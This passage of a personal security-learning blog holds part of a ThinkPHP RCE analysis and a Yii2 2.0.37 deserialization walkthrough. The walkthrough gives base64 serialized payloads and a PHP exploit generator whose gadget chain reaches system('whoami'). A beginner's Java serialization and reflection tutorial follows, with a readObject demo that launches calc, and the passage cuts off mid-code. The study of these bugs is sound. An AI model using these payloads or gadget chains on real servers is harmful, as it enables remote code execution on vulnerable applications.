<p>在<code>App::checkRoute</code>中会调用到<code>Route::check</code>，进行路由检测，将url（s的值）将<code>/</code>替换成<code>|</code>然后返回一个<code>Url</code>（继承Dispatch）类，最后返回至<code>App::run</code></p>
<p><img src="https://img-blog.csdnimg.cn/7384cb0561bd48759d38125f5309c84e.png" alt="img"></p>
<p>调用到<code>Url::init</code>,最终<code>$dispatch</code>为<code>Module</code>类</p>
<p>之后执行路由调度，调用<code>Module::exec</code>获得data</p>
<p>在<code>Module::exec</code>中会利用反射的方法获取当前需要操作的方法，并通过<code>Request</code>类获取url中我们传入的变量，因为这些都是一开始保存在了Request类中</p>
<p><img src="https://img-blog.csdnimg.cn/45b02b7e5ab4492c951089bb40168379.png" alt="img"></p>
<p>最后通过反射的方法，调用到了<code>Container::invokefunction</code>，实现RCE</p>
<ul>
<li>POST不能用 </li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/c147d778eee24d58adf02408fe3b907d.png" alt="img"></p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>通过和<code>5.1.41</code>比较就可以发现<code>dispatcha\Url::parseUrl</code></p>
<p><img src="https://img-blog.csdnimg.cn/f75c49f822eb4fcfaff15a7da2a3d57b.png" alt="img"></p>
<h2 id="Yii2-反序列化"><a href="#Yii2-反序列化" class="headerlink" title="Yii2 反序列化"></a>Yii2 反序列化</h2><p><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></p>
<p>环境搭建详见reference</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220518093326494.png" alt="image-20220518093326494"></p>
<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?r=exp/sss&amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/e16ed3b9f69d479797e288c2033d3d9e.png" alt="img"></p>
<h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>入口是我们自己写的<code>Controller</code></p>
<p>照例全局搜索一下可以利用点，因为入口就写了一个反序列化，所以就先去找<code>__destruct</code>或者<code>__construct</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Swift_ByteStream_TemporaryFileByteStream::__destruct,Swift_KeyCache_DiskKeyCache::__destruct可以触发__toString</span><br><span class="line">2.BatchQueryResult::__destruct可以触发__call或者调用到某一个类的close方法</span><br><span class="line">3.XmlBuilder::__toString触发__call</span><br><span class="line">4.Covers::__toString 触发 __call 或者 render</span><br><span class="line">5.Nullable::__toString 触发__call</span><br><span class="line">6.ExactValueToken::__toString 触发__call 或者 stringify</span><br><span class="line">7.LazyString::__toString 触发 __invoke</span><br><span class="line">8.</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>当然很多时候我们也可以先找可能可以利用的点再去，就比如在看的时候发现<code>ActionSequence::run</code>中就存在我们可能可以利用的<code>call_user_func_array</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$context</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;actions <span class="keyword">as</span> <span class="variable">$step</span>) &#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> $step Action  **/</span></span><br><span class="line">        codecept_debug(<span class="string">&quot;- <span class="subst">$step</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            call_user_func_array([<span class="variable">$context</span>, <span class="variable">$step</span>-&gt;getAction()], <span class="variable">$step</span>-&gt;getArguments());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="variable">$class</span> = get_class(<span class="variable">$e</span>); <span class="comment">// rethrow exception for a specific action</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="variable">$class</span>(<span class="variable">$e</span>-&gt;getMessage() . <span class="string">&quot;\nat <span class="subst">$step</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过现在我们就先从头到尾吧</p>
<p>就比如一开始的<code>Swift_ByteStream_TemporaryFileByteStream::__destruct</code>可以触发<code>__toString</code>，先来找这一种的链子吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Swift_ByteStream_TemporaryFileByteStream::__destruct</span><br><span class="line">	XmlBuilder::__toString</span><br><span class="line">		Generator::__call</span><br><span class="line">			Generator::format</span><br><span class="line">				Generator::getFormatter</span><br></pre></td></tr></table></figure>

<p>首先我们看到<code>Swift_KeyCache_DiskKeyCache::__destruct</code>，会调用到<code>clearAll</code>，并在该方法里可以触发到<code>XmlBuilder::__toString</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys <span class="keyword">as</span> <span class="variable">$nsKey</span> =&gt; <span class="variable">$null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearAll(<span class="variable">$nsKey</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/d53f38f794a9427bb605ab33d8e496fe.png" alt="img"></p>
<p><code>XmlBuilder::__toString</code>调用到<code>saveXML</code>，那么可能可以触发<code>__call</code>，或者是可以利用的<code>saveXML</code>，咱们可以先去找<code>__call</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__dom__-&gt;saveXML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会发现一眼看过去比较好利用的也就只有<code>Generator::__call</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用到format $method : saveXML $attributes : null</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format(<span class="variable">$method</span>, <span class="variable">$attributes</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以利用$this-&gt;formatters数组返回我们想调用的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$formatter</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$provider</span>, <span class="variable">$formatter</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>] = <span class="keyword">array</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(sprintf(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="variable">$formatter</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=TzozOToiRGlzS2V5Q2FjaGVcU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoxOntzOjQ1OiIARGlzS2V5Q2FjaGVcU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAHBhdGgiO086Mjc6IkNvZGVjZXB0aW9uXFV0aWxcWG1sQnVpbGRlciI6MTp7czoxMDoiACoAX19kb21fXyI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEwOiJmb3JtYXR0ZXJzIjthOjE6e3M6Nzoic2F2ZVhNTCI7czo5OiJwaHBpbmZvKCkiO319fX0=</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6eac1b6197dd46189dafcca9ab839c1f.png" alt="img">‘不行，换一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BatchQueryResult::__destruct</span><br><span class="line">		Generator::__call</span><br><span class="line">			Generator::format</span><br><span class="line">				Generator::getFormatter</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ameuu</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">var_dump(base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult())));</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/4f9ede86d7824ecbac10a199d3adde59.png" alt="img"></p>
<p>但是我们又发现一个重要问题，这里只能执行类似于<code>phpinfo</code>这样的函数，我们没有办法传入参数，也做不到无参数RCE，那么只能利用现在已有的链子，试着找到可以利用的已经定义好的不用参数的方法</p>
<p>找到<code>CreateAction::run</code>，直接可以利用</p>
<p><img src="https://img-blog.csdnimg.cn/4d89bd7310a24c81898ec0d54c8d7c9b.png" alt="img"></p>
<p>最终poc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CreateAction</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$checkAccess</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(),<span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ameuu</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">var_dump(base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult())));</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/13c6c8954f5e4535b5d5eb941f996011.png" alt="img"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里什么都没有捏~</p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>ThinkPHP</tag>
        <tag>yii</tag>
        <tag>因为不知道该干什么所以代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>java初步学习</title>
    <url>/2022/03/18/java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p> 因为上学期学了java课，但是发现别的班讲了序列化和正则之类的，所以打算学一下</p>
</blockquote>
<h4 id="一、序列化概述"><a href="#一、序列化概述" class="headerlink" title="一、序列化概述"></a>一、序列化概述</h4><p>序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 有序列化，就有反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。<u>（来源网络）</u></p>
<p>序列化最重要的作用：在传递和保存对象时.保证对象的完整性和可传递性。对象转换为有序字节流,以便在网络上传输或者保存在本地文件中。</p>
<p>反序列化的最重要的作用：根据字节流中保存的对象状态及描述信息，通过反序列化重建对象。</p>
<p>总结：核心作用就是对象状态的保存和重建。（整个过程核心点就是字节流中所保存的对象状态及描述信息）</p>
<p>例如在php中如果要保存一个类，可以利用序列化将类保存成二进制内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">var_dump(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"></span><br><span class="line"><span class="comment">//string(12) &quot;O:1:&quot;A&quot;:0:&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="二、java序列化"><a href="#二、java序列化" class="headerlink" title="二、java序列化"></a>二、java序列化</h4><blockquote>
<p>java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。<br>java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br>只有实现了Serializable和Externalizable接口的类的对象才能被序列化。Externalizable接口继承自 Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以 采用默认的序列化方式 。<br>　　对象序列化包括如下步骤：<br>　　1） 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流；<br>　　2） 通过对象输出流的writeObject()方法写对象。</p>
<p>　　对象反序列化的步骤如下：<br>　　1） 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流；<br>　　2） 通过对象输入流的readObject()方法读取对象。</p>
</blockquote>
<p>所以可以用不同的方式实现对象的序列化</p>
<p><a href="https://www.runoob.com/java/java-serialization.html">菜鸟教程</a></p>
<h5 id="1-初步认识java序列化和反序列化"><a href="#1-初步认识java序列化和反序列化" class="headerlink" title="1.初步认识java序列化和反序列化"></a>1.初步认识java序列化和反序列化</h5><p>//用于序列化的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> sex;</span><br><span class="line">    Student(<span class="keyword">int</span> id,String name,<span class="keyword">char</span> sex)&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">char</span> sex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>//实现序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Student std)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        obj.writeObject(std);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化成功！&quot;</span>);</span><br><span class="line">        obj.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// �� sr demo.Student��e�(�� I idC sexL namet Ljava/lang/String;xp   Yst Ameuu</span></span><br></pre></td></tr></table></figure>

<p>//实现反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unSerialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;output.txt&quot;</span>)));</span><br><span class="line">        Student student = (Student) objectInputStream.readObject();</span><br><span class="line">        System.out.println(student.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化成功&quot;</span>);</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-深入学习"><a href="#2-深入学习" class="headerlink" title="2.深入学习"></a>2.深入学习</h5><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010">java序列化和反序列化全讲解</a></p>
<p>序列化方法：原生、xml、json等</p>
<ol>
<li>序列化的类必须实现Serialize接口</li>
<li>静态变量不能被序列化</li>
<li><code>transient</code>不参与序列化</li>
</ol>
<p><code>readObject</code>方法的安全问题：当类被反序列化的时候，如果类里面有<code>readObejct</code>方法就会自动执行代码（只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力</p>
<p><strong>Tips:</strong></p>
<blockquote>
<p>共同条件 继承Serialize</p>
</blockquote>
<blockquote>
<p>入口类 source（重写readObject=&gt;调用常见的函数 参数类型宽泛 最好jdk自带） 如 <code>Map</code>、<code>HashMap</code></p>
</blockquote>
<blockquote>
<p>调用链 gadget chain</p>
</blockquote>
<blockquote>
<p>执行类 sink （rce ssrf 写文件……）</p>
</blockquote>
<p><strong>漏洞相关：</strong></p>
<p>当进行ssrf的时候，java中的<code>URL</code>类（可序列化）</p>
<h5 id="3-深入学习之java反射"><a href="#3-深入学习之java反射" class="headerlink" title="3.深入学习之java反射"></a>3.深入学习之java反射</h5><p><strong>反射：</strong>一开始我们并不知道我们要初始化的类对象是什么，自然也无法使用new关键字来创建对象</p>
<p>（可利用java反射调用default修饰的类、调用方法</p>
<p><code>Student</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    Student(int id,String name,char sex)&#123;</span></span><br><span class="line"><span class="comment">//        this.id = id;</span></span><br><span class="line"><span class="comment">//        this.name = name;</span></span><br><span class="line"><span class="comment">//        this.sex = sex;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">char</span> sex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is a student&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>RefectionTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefectionTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        Class c = student.getClass();</span><br><span class="line">        <span class="comment">// 反射就是操作Class</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从原型class里实例化对象</span></span><br><span class="line"><span class="comment">//        c.newInstance();</span></span><br><span class="line">        <span class="comment">// 可以利用这个来获取构造方法</span></span><br><span class="line">        <span class="comment">// 然后getConstructor方法里面可以写入参数 类似于String.class用来匹配我们想要实例化</span></span><br><span class="line">        <span class="comment">// 的类的有参构造方法的参数</span></span><br><span class="line">        Constructor constructor = c.getConstructor();</span><br><span class="line">        <span class="comment">// 进行实例化</span></span><br><span class="line">        Student student1 = (Student) constructor.newInstance();</span><br><span class="line">        System.out.println(student1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类里面属性</span></span><br><span class="line"><span class="comment">//        c.getFields(); // 获取所有属性</span></span><br><span class="line">        <span 